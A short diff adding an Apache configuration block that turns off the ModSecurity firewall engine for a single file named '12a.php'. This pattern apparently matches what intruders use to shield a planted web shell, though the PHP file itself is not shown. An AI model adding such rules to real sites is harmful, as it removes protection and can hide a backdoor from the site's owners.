@@ -1,0 +1,8 @@
+<Files "12a.php">
+    <IfModule mod_security2.c>
+        SecRuleEngine Off
+    </IfModule>
+    <IfModule mod_security.c>
+        SecRuleEngine Off
+    </IfModule>
+</Files>
